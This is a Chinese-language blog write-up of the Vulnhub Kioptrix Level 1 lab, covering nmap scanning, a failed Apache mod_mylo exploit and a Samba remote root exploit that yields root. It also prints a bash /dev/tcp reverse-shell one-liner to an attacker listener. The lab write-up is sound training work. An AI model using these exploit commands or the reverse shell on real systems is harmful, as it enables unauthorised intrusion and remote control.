<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Vulnhub-KioptrixLevel1通关记录 | Peony</title><meta name="author" content="Peony"><meta name="copyright" content="Peony"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文记录了作者在通关vulnhub靶机Kioptix Level1中遇到的问题以及踩坑后的解决方案。涉及smb爆破，终端稳定性提高等有效操作。">
<meta property="og:type" content="article">
<meta property="og:title" content="Vulnhub-KioptrixLevel1通关记录">
<meta property="og:url" content="https://peonycsa.com/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="Peony">
<meta property="og:description" content="本文记录了作者在通关vulnhub靶机Kioptix Level1中遇到的问题以及踩坑后的解决方案。涉及smb爆破，终端稳定性提高等有效操作。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg">
<meta property="article:published_time" content="2023-10-27T02:45:07.000Z">
<meta property="article:modified_time" content="2023-10-27T03:19:56.326Z">
<meta property="article:author" content="Peony">
<meta property="article:tag" content="Kioptrix">
<meta property="article:tag" content="vulnhub">
<meta property="article:tag" content="WriteUp">
<meta property="article:tag" content="靶场">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg"><link rel="shortcut icon" href="https://pic.imgdb.cn/item/647c139af024cca1732734de.png"><link rel="canonical" href="https://peonycsa.com/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Vulnhub-KioptrixLevel1通关记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-27 11:19:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imgdb.cn/item/647c139af024cca1732734de.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 杂项</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/life/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Peony"><span class="site-name">Peony</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 杂项</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/life/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub-KioptrixLevel1通关记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-27T02:45:07.000Z" title="发表于 2023-10-27 10:45:07">2023-10-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-27T03:19:56.326Z" title="更新于 2023-10-27 11:19:56">2023-10-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WriteUp/">WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p>靶机 IP :  10.8.12.128</p>
<blockquote>
<p>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
</blockquote>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>按照常规的方法：通过 TCP | UDP 扫描端口、获取开放端口对应信息、系统版本信息</p>
<p>下面是通过 TCP 扫描发现所收集到的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sT -p- --min-rate 10000 10.8.12.128 -oN nmapscan/portscan.txt</span><br><span class="line">Nmap scan report for 10.8.12.128</span><br><span class="line">Host is up (0.00067s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">443/tcp  open  https</span><br><span class="line">1024/tcp open  kdm</span><br><span class="line"></span><br><span class="line">$ sudo nmap -sT -p22,80,111,139,443,1024 -sV -sC -O --min-rate 10000 10.8.12.128 -oN nmapscan/servscan.txt</span><br><span class="line">.......</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">.......</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据 <code>nmap</code> 的扫描结果，可以看到靶机开放了22，80，111，139，443，1024端口，对应的服务分别为 ssh ，web ， smb ，rpc<sup><a href="#RPC%E5%8D%8F%E8%AE%AE">①</a></sup>。 </p>
<h3 id="Web-目录扫描"><a href="#Web-目录扫描" class="headerlink" title="Web 目录扫描"></a>Web 目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/.html                (Status: 403) [Size: 269]</span><br><span class="line">/index.html           (Status: 200) [Size: 2890]</span><br><span class="line">/test.php             (Status: 200) [Size: 27]</span><br><span class="line">/manual               (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/]</span><br><span class="line">/usage                (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/]</span><br><span class="line">/mrtg                 (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/]</span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><h3 id="失败尝试：绕过-127-0-0-1-限制"><a href="#失败尝试：绕过-127-0-0-1-限制" class="headerlink" title="失败尝试：绕过 127.0.0.1 限制"></a>失败尝试：绕过 <code>127.0.0.1</code> 限制</h3><p>因为看到如下提示，就在想能不能用绕过的方式，访问到 <code>127.0.0.1</code> 的资源，期间尝试了以下几种方法：</p>
<ol>
<li>添加 <code>x-forward-for</code> 头，但是依旧重定向到 <code>127.0.0.1</code> ；</li>
<li>通过 SSRF 的方式绕过，但未找到可利用的文件；</li>
</ol>
<h3 id="失败尝试：Apache-1-3-20-RCE"><a href="#失败尝试：Apache-1-3-20-RCE" class="headerlink" title="失败尝试：Apache 1.3.20 RCE"></a>失败尝试：Apache 1.3.20 RCE</h3><p>通过 <code>searchsploit</code> 查询到 <code>Apache 1.3.20</code> 存在 RCE 漏洞，将对应的脚本 <code>67.c</code> 复制到本地后进行使用 <code>gcc</code> 编译，但编译后爆破攻击失败。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit Apache 1.3</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">Apache 1.3.x mod_mylo - Remote Code Execution | multiple/remote/67.c </span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">$ searchsploit -m 67.c</span><br><span class="line">  Exploit: Apache 1.3.x mod_mylo - Remote Code Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/67</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/multiple/remote/67.c</span><br><span class="line">    Codes: OSVDB-10976, CVE-2003-0651</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C source, ASCII text</span><br><span class="line">Copied to: /home/kali/Desktop/BoxWalk/Vulnhub/kioptrix/level1/67.c</span><br><span class="line"></span><br><span class="line">$ gcc -o 67 67.c</span><br><span class="line"></span><br><span class="line">$ ./67 -h</span><br><span class="line">Apache + mod_mylo remote exploit</span><br><span class="line">By Carl Livitt (carllivitt at hush dot com)</span><br><span class="line"></span><br><span class="line">Arguments:</span><br><span class="line">  -t target       Attack &#x27;target&#x27; host</span><br><span class="line">  -T platform     Use parameters for target &#x27;platform&#x27;</span><br><span class="line">  -h              This help.</span><br><span class="line"></span><br><span class="line">Available platforms:</span><br><span class="line"> 0. SuSE 8.1, Apache 1.3.27 (installed from source) (default)</span><br><span class="line"> 1. RedHat 7.2, Apache 1.3.20 (installed from RPM)</span><br><span class="line"> 2. RedHat 7.3, Apache 1.3.23 (installed from RPM)</span><br><span class="line"> 3. FreeBSD 4.8, Apache 1.3.27 (from Ports)</span><br><span class="line"></span><br><span class="line">$ ./67 -t 10.8.12.128 -T 1</span><br><span class="line">[-] Attempting attack [ RedHat 7.2, Apache 1.3.20 (installed from RPM) ] ...</span><br><span class="line">[*] Bruteforce failed....</span><br><span class="line"></span><br><span class="line">Have a nice day!</span><br></pre></td></tr></table></figure>

<h3 id="smb攻击"><a href="#smb攻击" class="headerlink" title="smb攻击"></a>smb攻击</h3><p>发现靶机开放了139端口，使用 <code>msf</code> 对 smb 服务进行攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit samba | grep 10.c</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c</span><br><span class="line"></span><br><span class="line">$ ./a.out -b0 10.8.12.128</span><br><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">+ Bruteforce mode. (Linux)</span><br><span class="line">+ Host is running samba.</span><br><span class="line">+ Worked!</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">*** JE MOET JE MUIL HOUWE</span><br><span class="line">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span><br><span class="line">uid=0(root) gid=0(root) groups=99(nobody)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">tty</span><br><span class="line">not a tty</span><br></pre></td></tr></table></figure>

<p>尝试的是将反弹的shell升级为完整的TTY（交互式shell），直接再shell中再次发起回连，然后在攻击机上使用 <code>rlwrap</code> 监听。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># target</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.213.129/10234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># kali</span><br><span class="line">$ rlwrap nc -lvnp 10234                                             </span><br><span class="line">listening on [any] 10234 ...</span><br><span class="line">connect to [192.168.213.129] from (UNKNOWN) [192.168.213.128] 1026</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@kioptrix tmp]#  </span><br></pre></td></tr></table></figure>

<p>虽然仍然不是完整的TTY，但是支持用方向键查看历史记录了，并且用户权限为root权限，测试结束。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机比较简单，来源于<a target="_blank" rel="noopener" href="https://twitter.com/TJ_Null">@TJ_Null</a>大神更新的 <a target="_blank" rel="noopener" href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?pli=1#gid=998752843">NetSecFocus Trophy Room(Oct 12, 2023)</a>。比较费时的是之前的两次失败尝试，让我在简单靶机上耽搁和浪费了不少时间。</p>
<p>总而言之，在渗透过程中，攻击者应该做好攻击向量的资源分配，以免出现事半功倍的情况。</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="RPC协议"><a href="#RPC协议" class="headerlink" title="RPC协议"></a>RPC协议</h3><blockquote>
<p>RPC（ Remote Procedure Call ）远程过程调用协议，一种通过网络从远程计算机上请求服务，而不需要了解底层网络技术的协议。RPC 它假定某些协议的存在，例如 TPC &#x2F; UDP 等，为通信程序之间携带信息数据。在 OSI 网络七层模型中，RPC 跨越了传输层和应用层，RPC 使得开发，包括网络分布式多程序在内的应用程序更加容易。</p>
</blockquote>
<p><img src="https://pic.imgdb.cn/item/64a6d7c41ddac507ccd18b65.jpg" alt="RPC流程图"></p>
<h3 id="CGI-定义"><a href="#CGI-定义" class="headerlink" title="CGI 定义"></a>CGI 定义</h3><blockquote>
<p>CGI 目前由NCSA维护，NCSA 定义 CGI 如下：</p>
<p>CGI ( Common Gateway Interface ) ，通用网关接口，它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端 HTML 页面的接口。</p>
</blockquote>
<p>CGI 工作流程（用户在网页上点击一个链接或URL）：</p>
<ol>
<li>使用你的浏览器访问URL并连接到HTTP web 服务器。</li>
<li>Web服务器接收到请求信息后会解析URL，并查找访问的文件在服务器上是否存在，如果存在返回文件的内容，否则返回错误信息。</li>
<li>浏览器从服务器上接收信息，并显示接收的文件或者错误信息。</li>
</ol>
<p>CGI 程序可以是 Python 脚本，PERL 脚本，SHELL 脚本，C 或者 C++ 程序等。</p>
<p><img src="https://pic.imgdb.cn/item/64a6ef551ddac507cc075799.jpg" alt="CGI架构图"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://peonycsa.com">Peony</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://peonycsa.com/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">https://peonycsa.com/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://peonycsa.com" target="_blank">Peony</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Kioptrix/">Kioptrix</a><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://fastly.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/27/Github%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2/" title="Github敏感信息搜索"><img class="cover" src="https://pic.imgdb.cn/item/64fa9349661c6c8e5490bd62.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Github敏感信息搜索</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/06/10/vulnhub-JARBAS%E9%80%9A%E5%85%B3/" title="vulnhub-JARBAS通关"><img class="cover" src="https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-10</div><div class="title">vulnhub-JARBAS通关</div></div></a></div><div><a href="/2023/06/03/vulnhub-w1r3s%E9%80%9A%E5%85%B3/" title="vulnhub-w1r3s通关"><img class="cover" src="https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-03</div><div class="title">vulnhub-w1r3s通关</div></div></a></div><div><a href="/2023/04/18/vulnhub-Narak%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub-Narak通关记录"><img class="cover" src="https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-18</div><div class="title">vulnhub-Narak通关记录</div></div></a></div><div><a href="/2023/09/11/Vulnhub-SICKOSv1-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-SICKOSv1.1通关记录"><img class="cover" src="https://pic.imgdb.cn/item/64aae46e1ddac507cc3c4359.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-11</div><div class="title">Vulnhub-SICKOSv1.1通关记录</div></div></a></div><div><a href="/2023/07/10/HTB-PC%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="HTB-PC通关记录"><img class="cover" src="https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-10</div><div class="title">HTB-PC通关记录</div></div></a></div><div><a href="/2023/03/26/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" title="upload-labs靶场通关"><img class="cover" src="https://pic.imgdb.cn/item/647c13adf024cca1732755e2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-26</div><div class="title">upload-labs靶场通关</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imgdb.cn/item/647c139af024cca1732734de.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Peony</div><div class="author-info__description">知道自己需要的是什么之后，真正的学习才算开始。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Catsofsuffering"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Catsofsuffering" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:graywar1@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶机描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">nmap扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">Web 